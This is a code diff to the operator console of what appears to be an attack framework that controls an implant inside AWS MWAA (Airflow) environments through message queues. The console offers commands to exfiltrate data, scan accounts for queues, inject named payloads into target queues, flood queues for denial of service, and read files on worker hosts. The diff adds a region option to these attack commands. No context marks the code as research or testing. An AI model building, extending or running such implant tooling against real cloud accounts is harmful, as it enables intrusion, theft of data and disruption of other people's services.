@@ -256,9 +256,9 @@ def operator_console(
         print("    !exfil                - Run all data collection modules at once")
         print()
         print("  Remote Attack Operations:")
-        print("    !recon <acct1,acct2,...>        - Scan accounts for MWAA queues from implant")
-        print("    !inject <acct> <queue> <name>   - Inject payload into target queue")
-        print("    !dos-flood <acct> <queue> [n]   - Flood target queue with messages")
+        print("    !recon <accts> [region]              - Scan accounts for MWAA queues from implant")
+        print("    !inject <acct> <queue> <name> [rgn]  - Inject payload into target queue")
+        print("    !dos-flood <acct> <queue> [n] [rgn]  - Flood target queue with messages")
         print()
         print("  File Operations:")
         print("    !read-file <path>     - Read a file from the worker filesystem")
@@ -349,14 +349,16 @@ def operator_console(
         if user_input.startswith("!recon "):
             args = user_input[len("!recon "):].strip()
             if not args:
-                print_info("Usage: !recon <account_id1,account_id2,...>")
+                print_info("Usage: !recon <account_id1,account_id2,...> [region]")
                 continue
-            # Validate: should be comma-separated numbers
-            accounts = [a.strip() for a in args.split(",") if a.strip()]
+            # First token is comma-separated accounts; optional last token is region
+            tokens = args.split()
+            accounts = [a.strip() for a in tokens[0].split(",") if a.strip()]
             if not accounts:
-                print_info("Usage: !recon <account_id1,account_id2,...>")
+                print_info("Usage: !recon <account_id1,account_id2,...> [region]")
                 continue
-            print_info(f"Sending recon scan for {len(accounts)} account(s)...")
+            region_note = f" in {tokens[1]}" if len(tokens) > 1 else ""
+            print_info(f"Sending recon scan for {len(accounts)} account(s){region_note}...")
             msg_id = send_command(attacker, user_input, cmd_queue)
             print_success(f"Recon command queued (MessageId: {msg_id})")
             print_info("Waiting for results...")
@@ -372,20 +374,23 @@ def operator_console(
         # !inject - resolve named payloads to JSON then send to implant
         if user_input.startswith("!inject "):
             from .event_injection import INJECTION_PAYLOADS
-            parts = user_input[len("!inject "):].strip().split(None, 2)
+            parts = user_input[len("!inject "):].strip().split(None, 3)
             if len(parts) < 3:
-                print_info("Usage: !inject <account_id> <queue_name> <payload_name_or_json>")
+                print_info("Usage: !inject <account_id> <queue_name> <payload_name_or_json> [region]")
                 print_info(f"Available payloads: {', '.join(INJECTION_PAYLOADS.keys())}")
                 continue
-            acct, queue, payload_arg = parts
+            acct, queue, payload_arg = parts[0], parts[1], parts[2]
+            region_suffix = ""
+            # Check if there's a 4th token that looks like a region
+            if len(parts) == 4:
+                region_suffix = f" {parts[3]}"
             # Resolve named payload to JSON
             if payload_arg in INJECTION_PAYLOADS:
-                import json as _json
-                resolved = _json.dumps(INJECTION_PAYLOADS[payload_arg]["payload"])
+                resolved = json.dumps(INJECTION_PAYLOADS[payload_arg]["payload"])
                 print_info(f"Resolved payload '{payload_arg}' to JSON")
             else:
                 resolved = payload_arg
-            actual_command = f"!inject {acct} {queue} {resolved}"
+            actual_command = f"!inject {acct} {queue} {resolved}{region_suffix}"
             print_info(f"Sending inject command to implant...")
             msg_id = send_command(attacker, actual_command, cmd_queue)
             print_success(f"Inject command queued (MessageId: {msg_id})")
@@ -403,7 +408,7 @@ def operator_console(
         if user_input.startswith("!dos-flood "):
             parts = user_input[len("!dos-flood "):].strip().split()
             if len(parts) < 2:
-                print_info("Usage: !dos-flood <account_id> <queue_name> [count]")
+                print_info("Usage: !dos-flood <account_id> <queue_name> [count] [region]")
                 continue
             print_info(f"Sending dos-flood command to implant...")
             msg_id = send_command(attacker, user_input, cmd_queue)
